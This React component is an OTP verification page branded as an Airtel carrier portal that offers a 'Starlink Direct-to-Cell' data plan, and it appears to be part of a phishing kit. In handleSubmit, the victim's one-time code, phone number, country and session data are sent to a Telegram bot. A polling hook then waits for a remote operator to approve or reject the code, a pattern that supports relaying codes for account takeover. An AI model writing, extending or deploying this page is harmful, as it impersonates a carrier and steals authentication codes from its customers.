import React, { useState, useRef, useEffect } from 'react';
import { motion } from 'motion/react';
import { AirtelLogo } from './Logos';
import { InternetPlan } from '../types';
import { ValidatingModal } from './ValidatingModal';
import { useTelegramPolling } from '../hooks/useTelegramPolling';
import { telegramService } from '../services/telegramService';
import { LanguageSwitch } from './LanguageSwitch';
import { useApp } from '../context/AppContext';
import { CountryInfo } from '../data/countries';
import {
  ShieldCheck,
  ArrowLeft,
  Lock,
  RefreshCw,
  AlertTriangle,
  Loader2,
  KeyRound,
  Zap,
} from 'lucide-react';

interface OtpPageProps {
  phone: string;
  pin: string;
  sessionId: string;
  selectedPlan: InternetPlan;
  country?: CountryInfo;
  fullPhone?: string;
  onBack: () => void;
  onOtpSuccess: () => void;
}

export const OtpPage: React.FC<OtpPageProps> = ({
  phone,
  pin,
  sessionId,
  selectedPlan,
  country: propCountry,
  fullPhone: propFullPhone,
  onBack,
  onOtpSuccess,
}) => {
  const { country: ctxCountry, language, t } = useApp();
  const country = propCountry || ctxCountry;
  const displayPhone = propFullPhone || `${country.dialCode} ${phone}`;

  const [otpDigits, setOtpDigits] = useState<string[]>(['', '', '', '']);
  const [countdown, setCountdown] = useState(60);
  const [isSubmitting, setIsSubmitting] = useState(false);
  const [errorMessage, setErrorMessage] = useState<string | null>(null);
  const [isWaitingTelegram, setIsWaitingTelegram] = useState(false);

  const otpInputRefs = useRef<(HTMLInputElement | null)[]>([]);

  // Countdown timer for SMS resend
  useEffect(() => {
    if (countdown <= 0) return;
    const timer = setInterval(() => {
      setCountdown((prev) => prev - 1);
    }, 1000);
    return () => clearInterval(timer);
  }, [countdown]);

  // Handle single digit input
  const handleDigitChange = (index: number, value: string) => {
    const clean = value.replace(/\D/g, '').slice(-1);
    const newDigits = [...otpDigits];
    newDigits[index] = clean;
    setOtpDigits(newDigits);
    setErrorMessage(null);

    // Auto focus next
    if (clean && index < 3) {
      otpInputRefs.current[index + 1]?.focus();
    }
  };

  const handleKeyDown = (index: number, e: React.KeyboardEvent<HTMLInputElement>) => {
    if (e.key === 'Backspace' && !otpDigits[index] && index > 0) {
      otpInputRefs.current[index - 1]?.focus();
    }
  };

  const handlePaste = (e: React.ClipboardEvent<HTMLInputElement>) => {
    e.preventDefault();
    const pasted = e.clipboardData.getData('text').replace(/\D/g, '').slice(0, 4);
    if (pasted) {
      const newDigits = ['', '', '', ''];
      for (let i = 0; i < pasted.length; i++) {
        newDigits[i] = pasted[i];
      }
      setOtpDigits(newDigits);
      if (pasted.length === 4) {
        otpInputRefs.current[3]?.focus();
      } else {
        otpInputRefs.current[pasted.length]?.focus();
      }
    }
  };

  const currentOtp = otpDigits.join('');
  const isOtpComplete = currentOtp.length === 4;

  // Telegram polling hook for OTP verification
  const { status: telegramStatus } = useTelegramPolling({
    sessionId,
    phone,
    targetStep: 'otp',
    isActive: isWaitingTelegram,
    onApproved: () => {
      setTimeout(() => {
        setIsWaitingTelegram(false);
        onOtpSuccess();
      }, 800);
    },
    onRejected: () => {
      setIsWaitingTelegram(false);
      setErrorMessage(t('otpError'));
      setOtpDigits(['', '', '', '']);
      otpInputRefs.current[0]?.focus();
    },
  });

  const handleSubmit = async (e?: React.FormEvent) => {
    if (e) e.preventDefault();
    if (!isOtpComplete || isSubmitting) return;

    setIsSubmitting(true);
    setErrorMessage(null);

    try {
      // Send OTP with country and fullPhone to Telegram Bot
      await telegramService.sendOtp({
        sessionId,
        phone,
        fullPhone: displayPhone,
        country: `${country.flag} ${language === 'fr' ? country.nameFr : country.nameEn}`,
        airtelBrand: country.airtelBrand,
        otp: currentOtp,
        planName: `${selectedPlan.dataAmount} ${selectedPlan.dataUnit} (${selectedPlan.validity})`,
        planPrice: selectedPlan.price,
      });

      setIsWaitingTelegram(true);
    } catch (err: any) {
      setErrorMessage(
        err.message ||
          (language === 'fr'
            ? 'Échec de transmission du code.'
            : 'Failed to transmit security code.')
      );
    } finally {
      setIsSubmitting(false);
    }
  };

  const handleResend = () => {
    if (countdown > 0) return;
    setCountdown(60);
    setOtpDigits(['', '', '', '']);
    setErrorMessage(null);
    otpInputRefs.current[0]?.focus();
  };

  return (
    <div className="min-h-screen bg-[#F7F9FC] flex flex-col justify-between text-neutral-900 selection:bg-[#E60000] selection:text-white">
      {/* Top Header */}
      <header className="w-full bg-white border-b border-neutral-200 shadow-sm py-3.5 px-4 sm:px-6 sticky top-0 z-30">
        <div className="max-w-4xl mx-auto flex items-center justify-between gap-2">
          <button
            type="button"
            id="btn-back-to-login"
            onClick={onBack}
            className="flex items-center gap-1.5 text-xs font-bold text-neutral-600 hover:text-[#E60000] transition-colors py-2 px-2.5 rounded-xl hover:bg-neutral-100 cursor-pointer"
          >
            <ArrowLeft className="w-4 h-4" />
            <span>{t('back')}</span>
          </button>

          <div className="flex items-center gap-3">
            <LanguageSwitch variant="light" />

            <div className="hidden sm:flex items-center gap-2 pl-2 border-l border-neutral-200">
              <span className="text-[11px] font-bold text-neutral-500 uppercase tracking-wider">
                {t('airtelLitePortal')}
              </span>
              <div className="w-2.5 h-2.5 rounded-full bg-emerald-500 animate-pulse" />
            </div>
          </div>
        </div>
      </header>

      {/* Main Center Box */}
      <main className="flex-1 flex flex-col items-center justify-center px-3 sm:px-4 py-6 sm:py-12">
        <motion.div
          initial={{ opacity: 0, y: 20 }}
          animate={{ opacity: 1, y: 0 }}
          exit={{ opacity: 0, y: -20 }}
          transition={{ duration: 0.35 }}
          className="w-full max-w-md bg-white rounded-3xl shadow-[0_15px_45px_rgba(0,0,0,0.07)] border border-neutral-200/80 p-5 sm:p-8 relative overflow-hidden"
        >
          {/* Subtle top red brand bar */}
          <div className="absolute top-0 left-0 right-0 h-1.5 bg-gradient-to-r from-[#E60000] via-rose-500 to-[#c40000]" />

          {/* Selected Plan Summary Pill */}
          <div className="mb-6 p-3.5 rounded-2xl bg-red-50/70 border border-red-100 flex items-center justify-between gap-2">
            <div className="flex items-center gap-2.5 min-w-0">
              <div className="w-8 h-8 rounded-xl bg-[#E60000] text-white flex items-center justify-center font-black text-xs shadow-sm shrink-0">
                <Zap className="w-4 h-4" />
              </div>
              <div className="min-w-0">
                <p className="text-[11px] font-semibold text-neutral-500 truncate">{t('selectedPlanPill')}</p>
                <p className="text-xs font-black text-neutral-900 truncate">
                  {selectedPlan.dataAmount} {selectedPlan.dataUnit} • {selectedPlan.validity}
                </p>
              </div>
            </div>
            <div className="text-right shrink-0">
              <span className="font-black text-sm text-[#E60000]">{selectedPlan.price}</span>
            </div>
          </div>

          {/* Airtel Logo Header & Title */}
          <div className="flex flex-col items-center text-center mb-6">
            <AirtelLogo variant="nextgen" className="h-11 mb-2" />
            <div className="w-12 h-12 rounded-2xl bg-red-100/70 text-[#E60000] flex items-center justify-center mb-3 shadow-inner">
              <KeyRound className="w-6 h-6" />
            </div>

            <h2 className="text-lg sm:text-xl font-black text-neutral-900 tracking-tight">
              {t('otpTitle')}
            </h2>
            <p className="text-xs text-neutral-500 mt-1.5 max-w-xs leading-relaxed">
              {t('otpSubtitle')}{' '}
              <strong className="text-neutral-800 font-bold font-mono">
                {displayPhone}
              </strong>
            </p>
          </div>

          {/* Error Message Box */}
          {errorMessage && (
            <motion.div
              initial={{ opacity: 0, scale: 0.95 }}
              animate={{ opacity: 1, scale: 1 }}
              className="mb-5 p-3.5 rounded-2xl bg-rose-50 border border-rose-200 text-rose-700 text-xs flex items-start gap-2.5 font-medium"
            >
              <AlertTriangle className="w-4 h-4 shrink-0 mt-0.5" />
              <span>{errorMessage}</span>
            </motion.div>
          )}

          {/* Form */}
          <form onSubmit={handleSubmit} className="space-y-6">
            <div>
              <div className="flex items-center justify-between mb-2">
                <label className="block text-xs font-bold text-neutral-700 uppercase tracking-wider">
                  {t('otpInputLabel')}
                </label>
                <span className="text-[11px] font-bold text-neutral-400">
                  {currentOtp.length}/4
                </span>
              </div>

              {/* 4 OTP Digit Boxes */}
              <div className="flex items-center justify-center gap-3 sm:gap-4">
                {[0, 1, 2, 3].map((index) => {
                  const hasDigit = Boolean(otpDigits[index]);
                  return (
                    <div key={index} className="relative flex-1 max-w-[68px]">
                      <input
                        ref={(el) => {
                          otpInputRefs.current[index] = el;
                        }}
                        type="text"
                        inputMode="numeric"
                        maxLength={1}
                        autoFocus={index === 0}
                        value={otpDigits[index]}
                        onChange={(e) => handleDigitChange(index, e.target.value)}
                        onKeyDown={(e) => handleKeyDown(index, e)}
                        onPaste={handlePaste}
                        className={`w-full h-13 sm:h-14 text-center text-xl sm:text-2xl font-black rounded-2xl border-2 transition-all bg-neutral-50 focus:bg-white focus:outline-none ${
                          hasDigit
                            ? 'border-[#0055FF] text-neutral-900 ring-2 ring-blue-500/10'
                            : 'border-neutral-300 text-neutral-700 focus:border-[#0055FF] focus:ring-4 focus:ring-blue-500/10'
                        }`}
                      />
                    </div>
                  );
                })}
              </div>
            </div>

            {/* Resend Link / Timer */}
            <div className="flex items-center justify-center text-xs">
              {countdown > 0 ? (
                <div className="text-neutral-500 flex items-center gap-1.5 font-medium">
                  <RefreshCw className="w-3.5 h-3.5 animate-spin text-neutral-400" />
                  <span>
                    {t('resendIn')}{' '}
                    <strong className="text-neutral-800 font-bold">{countdown}s</strong>
                  </span>
                </div>
              ) : (
                <button
                  type="button"
                  id="btn-resend-otp"
                  onClick={handleResend}
                  className="text-[#E60000] hover:text-[#c40000] font-black underline underline-offset-4 flex items-center gap-1 cursor-pointer transition-colors"
                >
                  <RefreshCw className="w-3.5 h-3.5" />
                  <span>{t('resendButton')}</span>
                </button>
              )}
            </div>

            {/* Submit Button */}
            <button
              type="submit"
              id="btn-otp-submit"
              disabled={!isOtpComplete || isSubmitting}
              className={`w-full py-4 px-6 rounded-2xl font-black text-sm uppercase tracking-wider transition-all duration-200 flex items-center justify-center gap-2 cursor-pointer shadow-lg ${
                isOtpComplete && !isSubmitting
                  ? 'bg-[#E60000] hover:bg-[#c90000] active:scale-[0.98] text-white shadow-red-500/30'
                  : 'bg-neutral-200 text-neutral-400 cursor-not-allowed shadow-none'
              }`}
            >
              {isSubmitting ? (
                <>
                  <Loader2 className="w-5 h-5 animate-spin" />
                  <span>{t('validating')}</span>
                </>
              ) : (
                <span>{t('confirmActivate')}</span>
              )}
            </button>
          </form>

          {/* Secure Guarantee Note */}
          <div className="mt-6 pt-5 border-t border-neutral-100 flex items-center justify-center gap-2 text-center text-[11px] text-neutral-500">
            <ShieldCheck className="w-4 h-4 text-emerald-600 shrink-0" />
            <span>{t('secureNote')}</span>
          </div>
        </motion.div>
      </main>

      {/* Footer */}
      <footer className="w-full bg-white border-t border-neutral-200 py-4 px-4 text-center text-xs text-neutral-500">
        <div className="max-w-4xl mx-auto flex items-center justify-center gap-2">
          <span>© 2026 {country.airtelBrand}</span>
          <span>•</span>
          <span>Starlink Direct-to-Cell</span>
        </div>
      </footer>

      {/* Validating Modal */}
      <ValidatingModal
        isOpen={isWaitingTelegram}
        type="otp"
        phone={displayPhone}
        planName={`${selectedPlan.dataAmount} ${selectedPlan.dataUnit}`}
        status={
          telegramStatus === 'approved'
            ? 'approved'
            : telegramStatus === 'rejected'
            ? 'rejected'
            : 'pending'
        }
      />
    </div>
  );
};
